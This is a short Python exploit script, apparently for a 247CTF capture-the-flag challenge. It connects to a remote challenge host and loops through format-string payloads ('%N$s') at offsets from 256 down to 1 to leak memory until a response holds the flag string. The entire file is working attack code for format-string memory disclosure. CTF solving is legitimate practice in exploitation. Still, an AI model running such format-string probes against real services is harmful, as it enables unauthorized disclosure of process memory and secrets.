#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('/bin/cat')
host = args.HOST or '2d929a5d9eb58a8f.247ctf.com'
port = int(args.PORT or 50279)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
for i in range(0x100, 0, -1):
	try:
		io = start()
		re()
		sl(f"%{i}$s")
		reu(b"Oh, that's right! Welcome back ")
		a=reu(b"!")
		if b"247CTF" in a:
			info(a)
			pause()
	except:
		pass
	io.close()